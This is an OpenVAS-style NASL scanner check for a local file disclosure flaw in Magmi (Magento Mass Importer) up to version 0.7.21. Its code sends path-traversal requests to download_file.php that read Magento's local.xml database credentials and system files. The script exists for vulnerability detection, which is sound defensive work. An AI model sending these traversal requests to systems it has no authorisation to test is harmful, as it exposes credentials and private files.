# SPDX-FileCopyrightText: 2015 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:magmi_project:magmi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111041");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-10-14 18:00:00 +0200 (Wed, 14 Oct 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Magmi (Magento Mass Importer) <= 0.7.21 Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_magento_magmi_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magmi/http/detected");

  script_xref(name:"URL", value:"https://www.trustwave.com/Resources/SpiderLabs-Blog/Zero-day-in-Magmi-database-client-for-popular-e-commerce-platform-Magento-targeted-in-the-wild/");
  script_xref(name:"URL", value:"https://web.archive.org/web/20190515053239/http://wiki.magmi.org/index.php?title=Securing_Magmi_UI_access");

  script_tag(name:"summary", value:"Magmi (Magento Mass Importer) is prone to a local file
  disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks whether it is
  possible to get sensitive information.");

  script_tag(name:"insight", value:"Magmi does not sufficiently sanitize input submitted via URI
  parameters of potentially malicious data. This issue exists in the download_file.php script.");

  script_tag(name:"impact", value:"By submitting a malicious web request to this script that
  contains a relative path to a resource, it is possible to retrieve arbitrary files that are
  readable by the web server process.");

  script_tag(name:"affected", value:"Magmi version 0.7.21 is known to be affected. Other versions
  might be affected as well.");

  script_tag(name:"solution", value:"Please see the reference how to secure the Magmi UI access.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/web/download_file.php?file=../../app/etc/local.xml";

if( http_vuln_check( port:port, url:url, pattern:"<username>.*</username>", extra_check:"<password>.*</password>" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];
  url = dir + "/web/download_file.php?file=" + crap( data:"../../", length:45 ) + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
